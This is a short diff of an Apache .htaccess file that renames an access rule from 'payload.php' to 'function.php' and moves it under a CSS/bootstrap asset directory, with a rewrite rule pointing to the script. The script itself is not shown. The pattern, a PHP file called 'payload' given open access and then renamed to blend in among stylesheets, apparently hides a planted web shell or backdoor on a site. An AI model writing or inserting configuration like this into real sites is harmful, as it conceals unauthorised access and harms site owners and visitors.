@@ -1,7 +1,7 @@
-<Files "payload.php">
+<Files "function.php">
     Require all granted
 </Files>
 
 RewriteEngine On
-RewriteBase /web/magister-komunikasi/scss/
-RewriteRule ^payload$ payload.php [L]
+RewriteBase /web/magister-komunikasi/studylab-main/css/bootstrap/
+RewriteRule ^function$ function.php [L]
